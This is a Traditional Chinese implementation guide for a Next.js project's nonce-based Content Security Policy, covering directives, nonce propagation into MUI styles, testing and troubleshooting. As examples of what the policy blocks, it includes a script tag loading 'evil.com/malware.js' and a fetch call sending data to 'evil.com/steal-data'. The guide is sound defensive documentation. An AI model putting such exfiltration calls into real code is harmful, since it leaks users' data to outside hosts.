# Content Security Policy (CSP) 實作指南

本文檔說明 NPT 專案的 CSP (Content Security Policy) 實作細節。

---

## 目錄

- [Content Security Policy (CSP) 實作指南](#content-security-policy-csp-實作指南)
  - [目錄](#目錄)
  - [概述](#概述)
    - [為什麼需要 CSP？](#為什麼需要-csp)
    - [NPT 專案的 CSP 策略](#npt-專案的-csp-策略)
  - [CSP 架構](#csp-架構)
  - [Nonce-based 策略](#nonce-based-策略)
    - [什麼是 Nonce?](#什麼是-nonce)
    - [為什麼不用 'unsafe-inline'?](#為什麼不用-unsafe-inline)
  - [CSP 指令說明](#csp-指令說明)
    - [當前配置](#當前配置)
    - [指令詳解](#指令詳解)
      - [1. `default-src 'self'`](#1-default-src-self)
      - [2. `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'`](#2-script-src-self-nonce-nonce-strict-dynamic)
      - [3. `style-src 'self' 'nonce-{nonce}'`](#3-style-src-self-nonce-nonce)
      - [4. `connect-src 'self' {graphqlHttp} {graphqlWs}'`](#4-connect-src-self-graphqlhttp-graphqlws)
      - [5. `img-src 'self' data: https:`](#5-img-src-self-data-https)
      - [6. `frame-ancestors 'none'`](#6-frame-ancestors-none)
      - [7. `object-src 'none'`](#7-object-src-none)
  - [整合流程](#整合流程)
    - [1. Middleware 生成 Nonce](#1-middleware-生成-nonce)
    - [2. Layout 讀取 Nonce](#2-layout-讀取-nonce)
    - [3. Providers 傳遞 Nonce](#3-providers-傳遞-nonce)
    - [4. ThemeRegistry 應用 Nonce](#4-themeregistry-應用-nonce)
  - [測試與驗證](#測試與驗證)
    - [1. 檢查 CSP Header](#1-檢查-csp-header)
    - [2. 檢查樣式標籤](#2-檢查樣式標籤)
    - [3. 檢查 CSP 違規報告](#3-檢查-csp-違規報告)
    - [4. 功能測試清單](#4-功能測試清單)
  - [疑難排解](#疑難排解)
    - [問題 1: 頁面白屏，樣式無法載入](#問題-1-頁面白屏樣式無法載入)
    - [問題 2: GraphQL 請求被阻止](#問題-2-graphql-請求被阻止)
    - [問題 3: 外部 CDN 資源無法載入](#問題-3-外部-cdn-資源無法載入)
    - [問題 4: 開發環境 DevTools 問題](#問題-4-開發環境-devtools-問題)
  - [安全考量](#安全考量)
    - [1. Nonce 的強度](#1-nonce-的強度)
    - [2. 'strict-dynamic' 的影響](#2-strict-dynamic-的影響)
    - [3. 生產環境建議](#3-生產環境建議)
    - [4. CSP 監控](#4-csp-監控)
  - [相關文檔](#相關文檔)
  - [檢查清單](#檢查清單)
    - [實作完成確認](#實作完成確認)
    - [測試確認](#測試確認)
    - [安全確認](#安全確認)

## 概述

**Content Security Policy (CSP)** 是一個關鍵的 Web 安全機制，用於防止跨站腳本攻擊 (XSS) 和其他代碼注入攻擊。

### 為什麼需要 CSP？

- ✅ **防止 XSS 攻擊**: 限制可執行的腳本來源
- ✅ **資料竊取防護**: 控制資料可以發送到哪些端點
- ✅ **點擊劫持防護**: 防止網站被嵌入惡意 iframe
- ✅ **合規要求**: 許多安全認證要求實作 CSP

### NPT 專案的 CSP 策略

我們使用 **nonce-based CSP**，這是目前最安全且最靈活的 CSP 策略：

- 每個請求生成唯一的隨機 nonce
- 支援 Material-UI (Emotion) 動態樣式
- 支援 GraphQL WebSocket 訂閱
- 阻止所有未授權的腳本和樣式

---

## CSP 架構

```text
┌─────────────────────────────────────────────────────┐
│                    Browser Request                   │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│              middleware.ts (Next.js)                 │
│  1. 生成隨機 nonce (crypto.randomBytes)              │
│  2. 設置 x-nonce header                              │
│  3. 構建 CSP header 並返回                           │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│              layout.tsx (Server Component)           │
│  讀取 headers().get('x-nonce')                       │
│  傳遞 nonce 給 Providers                             │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│              Providers (Client Component)            │
│  傳遞 nonce 給 ThemeRegistry                         │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│              ThemeRegistry                           │
│  AppRouterCacheProvider({ nonce, ... })              │
│  MUI 官方 adapter 將 nonce 應用到所有動態樣式        │
└───────────────────────┬─────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────┐
│              Material-UI Components                  │
│  所有樣式標籤自動帶上 nonce 屬性                     │
│  <style nonce="abc123">...</style>                   │
└─────────────────────────────────────────────────────┘
```

---

## Nonce-based 策略

### 什麼是 Nonce?

**Nonce** = **N**umber used **once**

- 每個請求生成唯一的隨機字串
- 只有帶正確 nonce 的腳本/樣式才能執行
- 即使攻擊者注入代碼，也無法猜測正確的 nonce

### 為什麼不用 'unsafe-inline'?

傳統做法是在 CSP 中允許 `'unsafe-inline'`：

```
script-src 'self' 'unsafe-inline';  ❌ 不安全！
```

**問題**：

- 允許**所有**內聯腳本執行
- XSS 攻擊者可以注入任意腳本
- 失去 CSP 的保護作用

**Nonce-based 解決方案**：

```
script-src 'self' 'nonce-abc123' 'strict-dynamic';  ✅ 安全！
```

- 只允許帶正確 nonce 的內聯腳本
- 攻擊者無法猜測 nonce
- 保留完整的 CSP 保護

---

## CSP 指令說明

### 當前配置

我們的 CSP 配置位於 `apps/frontend/src/proxy.ts`：

```typescript
const cspDirectives = [
  "default-src 'self'",
  "script-src 'self' 'nonce-{nonce}' 'strict-dynamic'",
  "style-src 'self' 'nonce-{nonce}'",
  "img-src 'self' data: https:",
  "font-src 'self' data:",
  "connect-src 'self' {graphqlHttp} {graphqlWs}",
  "media-src 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
];
```

### 指令詳解

#### 1. `default-src 'self'`

**作用**: 預設所有資源只能來自同源

**允許**: `https://yourapp.com/script.js` ✅ **阻止**: `https://evil.com/script.js` ❌

#### 2. `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'`

**作用**: 控制可執行的 JavaScript

- `'self'`: 同源腳本
- `'nonce-{nonce}'`: 帶正確 nonce 的內聯腳本
- `'strict-dynamic'`: 允許 nonce 腳本動態載入其他腳本

**範例**:

```html
<!-- ✅ 允許：帶正確 nonce -->
<script nonce="abc123">
  console.log('Safe!');
</script>

<!-- ❌ 阻止：沒有 nonce -->
<script>
  alert('Blocked!');
</script>

<!-- ✅ 允許：同源腳本 -->
<script src="/app.js"></script>

<!-- ❌ 阻止：外部腳本（除非是 nonce 腳本動態載入） -->
<script src="https://evil.com/malware.js"></script>
```

#### 3. `style-src 'self' 'nonce-{nonce}'`

**作用**: 控制可應用的 CSS

- `'self'`: 同源樣式表
- `'nonce-{nonce}'`: 帶正確 nonce 的內聯樣式（Material-UI 需要）

**範例**:

```html
<!-- ✅ 允許：MUI 動態生成的樣式 -->
<style nonce="abc123">
  .MuiButton-root {
    color: blue;
  }
</style>

<!-- ❌ 阻止：沒有 nonce 的內聯樣式 -->
<style>
  body {
    background: red;
  }
</style>
```

#### 4. `connect-src 'self' {graphqlHttp} {graphqlWs}'`

**作用**: 控制 XHR、WebSocket、EventSource 等連線

- `'self'`: 同源連線
- GraphQL HTTP 端點 (例如 `http://localhost:4000`)
- GraphQL WebSocket 端點 (例如 `ws://localhost:4000`)

**範例**:

```javascript
// ✅ 允許：GraphQL 查詢
fetch('http://localhost:4000/graphql', { ... });

// ✅ 允許：GraphQL 訂閱
new WebSocket('ws://localhost:4000/graphql');

// ❌ 阻止：未授權的端點
fetch('https://evil.com/steal-data', { ... });
```

#### 5. `img-src 'self' data: https:`

**作用**: 控制圖片來源

- `'self'`: 同源圖片
- `data:`: base64 圖片
- `https:`: 任何 HTTPS 圖片（CDN、頭像等）

#### 6. `frame-ancestors 'none'`

**作用**: 防止點擊劫持 (Clickjacking)

**效果**: 禁止網站被嵌入 `<iframe>`、`<frame>`、`<object>` 等

**等同於**: `X-Frame-Options: DENY`

#### 7. `object-src 'none'`

**作用**: 禁止 `<object>`、`<embed>`、`<applet>` 標籤

**原因**: 這些標籤是常見的 XSS 攻擊向量

---

## 整合流程

### 1. Middleware 生成 Nonce

**檔案**: `apps/frontend/src/proxy.ts`

```typescript
// 使用 Web Crypto API（Edge Runtime 相容）
function generateNonce(): string {
  const array = crypto.getRandomValues(new Uint8Array(16));
  return btoa(String.fromCharCode(...Array.from(array)));
}

export default function middleware(request: NextRequest) {
  // 生成 16 bytes 隨機 nonce (Base64 編碼)
  const nonce = generateNonce();

  // ✅ 將 nonce 注入到 *request* headers — server components（如 layout.tsx）
  //    才能透過 next/headers 的 headers() 讀取
  request.headers.set('x-nonce', nonce);

  // 執行 next-intl 路由處理（讀取 request 並產生 NextResponse）
  const response = intlMiddleware(request);

  // 也將 nonce 設到 response headers 並補 CSP
  response.headers.set('x-nonce', nonce);
  response.headers.set('Content-Security-Policy', cspHeader);

  return response;
}
```

**重要**:

- 必須使用 **Web Crypto API** (`crypto.getRandomValues`) 而非 Node.js 的 `crypto.randomBytes()`，因為 Next.js Middleware 在 Edge Runtime 中執行，不支援 Node.js 內建模組。
- 必須將 `x-nonce` 設到 **request headers**（而非只設到 response），server components 透過 `headers()` 讀取的是 request headers。設錯位置會導致 server / client 拿到不同的 nonce 進而 hydration mismatch。

### 2. Layout 讀取 Nonce

**檔案**: `apps/frontend/src/app/[locale]/layout.tsx`

```typescript
export default async function LocaleLayout({ children, params }) {
  // 讀取 middleware 設置的 nonce header
  const headersList = await headers();
  const nonce = headersList.get('x-nonce') || undefined;

  return (
    <NextIntlClientProvider messages={messages}>
      <Providers nonce={nonce}>{children}</Providers>
    </NextIntlClientProvider>
  );
}
```

### 3. Providers 傳遞 Nonce

**檔案**: `apps/frontend/src/app/[locale]/providers.tsx`

```typescript
export function Providers({ children, nonce }: { children: ReactNode; nonce?: string }) {
  return (
    <ThemeRegistry nonce={nonce}>
      <ApolloProvider>
        {/* ... */}
      </ApolloProvider>
    </ThemeRegistry>
  );
}
```

### 4. ThemeRegistry 應用 Nonce

**檔案**: `apps/frontend/src/theme/ThemeRegistry.tsx`

模板使用 MUI 官方的 Next.js App Router 整合（`@mui/material-nextjs/v15-appRouter`），自動處理 SSR emotion cache 與 hydration 順序，避免自製 cache 與其他全域樣式（如 bprogress）的順序衝突。

```typescript
import { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';
import { ThemeProvider } from '@mui/material/styles';
import CssBaseline from '@mui/material/CssBaseline';

export function ThemeRegistry({ children, nonce }: { children: React.ReactNode; nonce?: string }) {
  return (
    <AppRouterCacheProvider options={{ key: 'mui', nonce, prepend: true }}>
      <ThemeProvider theme={theme}>
        <CssBaseline />
        {children}
      </ThemeProvider>
    </AppRouterCacheProvider>
  );
}
```

> 過去版本曾自寫 `createEmotionCache.ts` 搭配 `useMemo` 與 `CacheProvider`，但 Next.js 16 App Router 的 streaming SSR 容易與 emotion 的 `prepend` 行為衝突，導致 server / client 樣式順序不一致。改用官方 adapter 後問題消失。

---

## 測試與驗證

### 1. 檢查 CSP Header

**開啟瀏覽器開發者工具** → **Network** → 選擇任一請求 → **Headers**

應該看到：

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123...' 'strict-dynamic'; ...
x-nonce: abc123...
```

### 2. 檢查樣式標籤

**開啟瀏覽器開發者工具** → **Elements** → 搜尋 `<style>`

應該看到所有 MUI 樣式都帶 nonce：

```html
<style data-emotion="mui" nonce="abc123...">
  .MuiButton-root { ... }
</style>
```

### 3. 檢查 CSP 違規報告

**開啟瀏覽器開發者工具** → **Console**

- ✅ **無錯誤**: CSP 配置正確
- ❌ **有 CSP 錯誤**: 需要調整 CSP 配置

**常見錯誤範例**:

```
Refused to execute inline script because it violates CSP directive: "script-src 'self' 'nonce-...'".
→ 原因：腳本沒有帶正確的 nonce 屬性

Refused to connect to 'https://api.example.com' because it violates CSP directive: "connect-src 'self'".
→ 原因：connect-src 需要添加該 API 端點
```

### 4. 功能測試清單

- [ ] 頁面正常渲染（無白屏）
- [ ] Material-UI 樣式正確載入
- [ ] 按鈕、表單等互動正常
- [ ] GraphQL 查詢和變更正常
- [ ] GraphQL 訂閱 (WebSocket) 正常
- [ ] 圖片正常顯示
- [ ] 字體正常載入
- [ ] Console 無 CSP 違規錯誤

---

## 疑難排解

### 問題 1: 頁面白屏，樣式無法載入

**症狀**: 頁面渲染空白，Console 顯示 CSP 錯誤

**原因**: Material-UI 樣式沒有正確的 nonce

**解決方案**:

1. 確認 `proxy.ts` 正確生成並注入 `x-nonce` 到 **request headers**
2. 確認 `layout.tsx` 正確讀取 `x-nonce` header
3. 確認 `ThemeRegistry` 將 nonce 傳給 `AppRouterCacheProvider`

**檢查方式**:

```typescript
// 在 layout.tsx 添加 console.log
const nonce = headersList.get('x-nonce') || undefined;
console.log('[Layout] Nonce:', nonce); // 應該顯示一個 base64 字串
```

### 問題 2: GraphQL 請求被阻止

**症狀**: Console 顯示 `connect-src` 違規

```
Refused to connect to 'http://localhost:4000/graphql' because it violates CSP directive
```

**原因**: CSP 的 `connect-src` 沒有允許 GraphQL 端點

**解決方案**:

確認 `.env` 文件中的環境變數正確：

```bash
NEXT_PUBLIC_GRAPHQL_ENDPOINT=http://localhost:4000/graphql
NEXT_PUBLIC_GRAPHQL_WS_ENDPOINT=ws://localhost:4000/graphql
```

確認 `middleware.ts` 正確讀取環境變數：

```typescript
const graphqlHttpUrl = process.env.NEXT_PUBLIC_GRAPHQL_ENDPOINT || '...';
const graphqlWsUrl = process.env.NEXT_PUBLIC_GRAPHQL_WS_ENDPOINT || '...';
```

### 問題 3: 外部 CDN 資源無法載入

**症狀**: 外部圖片、字體無法載入

**解決方案**:

根據需要調整 CSP 指令：

```typescript
// 允許特定 CDN
"img-src 'self' data: https://cdn.example.com",

// 允許所有 HTTPS 圖片（當前配置）
"img-src 'self' data: https:",
```

### 問題 4: 開發環境 DevTools 問題

**症狀**: DevTools 顯示 CSP 警告

**解決方案**:

這是正常的！開發工具可能會嘗試注入一些腳本。可以選擇：

1. **忽略警告**（推薦）- 這不影響生產環境
2. **添加開發環境豁免**:

```typescript
const isDevelopment = process.env.NODE_ENV === 'development';

const cspDirectives = [
  // ... 其他指令
  ...(isDevelopment ? ["script-src 'self' 'nonce-{nonce}' 'unsafe-eval'"] : []),
];
```

---

## 安全考量

### 1. Nonce 的強度

**當前配置**: 16 bytes (128 bits) 隨機數

```typescript
// 使用 Web Crypto API 生成加密安全的隨機數
function generateNonce(): string {
  const array = crypto.getRandomValues(new Uint8Array(16));
  return btoa(String.fromCharCode(...Array.from(array)));
}
// 結果: "abc123def456..." (約 22 字元)
```

**為什麼安全？**

- 128 bits 隨機數 = 2^128 種可能
- 攻擊者猜中機率: 1 / 340,282,366,920,938,463,463,374,607,431,768,211,456
- 每個請求都不同，無法重放攻擊

### 2. 'strict-dynamic' 的影響

`'strict-dynamic'` 允許 nonce 腳本動態載入其他腳本。

**範例**:

```html
<script nonce="abc123">
  // ✅ 這個腳本可以執行（有 nonce）
  const script = document.createElement('script');
  script.src = '/analytics.js';
  document.body.appendChild(script);
  // ✅ analytics.js 也可以執行（由 nonce 腳本載入）
</script>
```

**安全性**:

- ✅ 只有授權的腳本能動態載入其他腳本
- ✅ 攻擊者注入的腳本仍然無法執行（沒有 nonce）
- ✅ 符合現代 Web 應用的需求

### 3. 生產環境建議

**升級不安全請求**:

```typescript
...(isDevelopment ? [] : ['upgrade-insecure-requests']),
```

**效果**: HTTP 請求自動升級為 HTTPS

**前提**: 生產環境必須支援 HTTPS

### 4. CSP 監控

**建議**: 設置 CSP 違規報告端點

```typescript
const cspDirectives = [
  // ... 其他指令
  'report-uri /api/csp-report', // 接收 CSP 違規報告
];
```

**實作**:

```typescript
// pages/api/csp-report.ts
export default function handler(req, res) {
  if (req.method === 'POST') {
    console.error('[CSP Violation]', req.body);
    // 記錄到監控系統（例如 Sentry）
  }
  res.status(204).end();
}
```

---

## 相關文檔

- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [Material-UI Emotion Cache](https://mui.com/material-ui/integrations/nextjs/)

---

## 檢查清單

### 實作完成確認

- [x] proxy.ts 已創建並生成 nonce（注入到 request headers）
- [x] CSP header 正確設置
- [x] layout.tsx 正確讀取 nonce
- [x] Providers 正確傳遞 nonce
- [x] ThemeRegistry 正確使用 nonce（透過 AppRouterCacheProvider）

### 測試確認

- [ ] TypeScript 編譯通過
- [ ] 頁面正常渲染
- [ ] MUI 樣式正確載入
- [ ] GraphQL 查詢正常
- [ ] GraphQL 訂閱正常
- [ ] Console 無 CSP 錯誤

### 安全確認

- [ ] 每個請求的 nonce 都不同
- [ ] 未授權的內聯腳本被阻止
- [ ] 未授權的外部連線被阻止
- [ ] frame-ancestors 防止點擊劫持
- [ ] 生產環境使用 HTTPS

---

**文檔版本**: 1.0
**最後更新**: 2026-02-16
**維護者**: Walker Chiu
